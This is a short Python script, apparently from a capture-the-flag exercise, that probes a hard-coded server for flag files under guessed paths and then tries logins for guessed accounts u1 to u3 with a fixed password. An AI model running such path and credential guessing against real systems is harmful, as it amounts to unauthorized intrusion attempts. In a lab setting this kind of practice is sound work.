import requests
BASE = "http://144.79.188.39:35964"
for path in ["/media/flag.txt","/media/flag","/media/flags.txt","/flag.txt","/media/admin/flag.txt","/media/secret.txt"]:
    r = requests.get(BASE+path, timeout=6)
    body = r.text
    is_html = body.strip().lower().startswith("<!doctype") or "<html" in body[:200].lower()
    print(path, r.status_code, "html=",is_html, "len=",len(body), repr(body[:80]))
# check user 2 identity (previous solver account)
for uid in [1,2,3]:
    r = requests.get(f"{BASE}/api/auth/login/", json={"username":f"u{uid}","password":"pass12345"}, timeout=8)
    print("guess u",uid, r.status_code)
